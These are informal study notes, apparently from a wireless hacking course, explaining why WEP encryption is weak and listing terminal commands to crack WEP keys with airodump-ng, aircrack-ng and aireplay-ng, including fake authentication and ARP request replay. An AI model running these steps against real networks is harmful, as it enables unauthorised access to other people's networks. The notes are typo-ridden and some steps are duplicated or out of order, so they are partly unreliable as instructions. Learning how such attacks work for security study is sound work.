Network hacking and gaining access basic notes
-Wired Equivalent Privacy
old encryption
use an algorithm called rc4 
it would encrypt data using key 
encrypted packet send in the air 
router decrypts packet using the key
problem how nit is implemented 
wep cracking 
wep generates key unique for each packet to do that generates random iv vector
each packect in encrypted using a unique key stream
random initialization vector used to generate key stream
initialization vector 24 bit only 
iv + key makes key stream
keystream+"data to send"=encrypted data
problem 
iv to small
iv sent in plain text
results
iv repeat on busy network
this make wep vunerable
repeated ivs can be used to determine key stream and break encryption
tool aircrack-ng

conclusion
capture large num of packects --->> airodump-ng
analyse capture iv and crack key --->> aircrack-ng

if idle network wep then process complicated
working on busy network

process
put adapter in monitor mode
then run command 
airodump-ng --bssid target network --channel 1 --write baqsic-wep wlan0

data increasing very fast 
under data column number of useful packets with diff iv 

not in terminator other page split horizontally
run command 
ls
aircrack-ng basic-wep01.cap 
telling key found
we can connect to network we got password
some time no asci copy key found remove colons
connect wityh this to net

steps
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
##open two terminal 
airodump-ng --band a wlan0 a show 5 giga hertz ##show networks
airodump-ng --bssid target network --channel 1 --write baqsic-wep wlan0

##second terminal
ls
aircrack-ng basic-wep01.cap 
note
airmong check kill process best to restart kali connect network

WEP CRACKING NETWORK NOT BUSY ISSUE

network not busy it will take a lot time to capture different iv 
force ap to generate ivs
problem
aps only communicates with connected clients
we cant comuinicate
we cant start attack
solution
associate with ap before the attack

steps 
##open three terminal
first 
airodump-ng --band a wlan0 a show 5 giga hertz ##show networks
airodump-ng --bssid target network --channel 1 --write arprelay wlan0
auth open
client show associated with network

second
aireplay-ng --fakeauth 0 -a bssid -h unspec wlan0
enter 

third 
ifconfig 
copy ether unspec

above process you are associated 
WEP CRACKING 
ARP REQUEST REPLAY
wait for arp packet 
capture it and replay it send it
this cause the ap to produce packect with new iv 
keep doing until enough ivs 

steps 
##open three terminal
first 
airodump-ng --band a wlan0 a show 5 giga hertz ##show networks
airodump-ng --bssid target network --channel 1 --write arprelay wlan0
auth open
client show associated with network

second
aireplay-ng --fakeauth 0 -a bssid -h unspec wlan0
enter here first 
aireplay-ng --fakeauth 0 -a bssid -h unspec wlan0
aircrack-ng arprelay01.cap

third 
ifconfig 
copy ether unspec
clear
aireplay-ng --arpreplay  -b bssid -h unspec wlan0
enter here sec
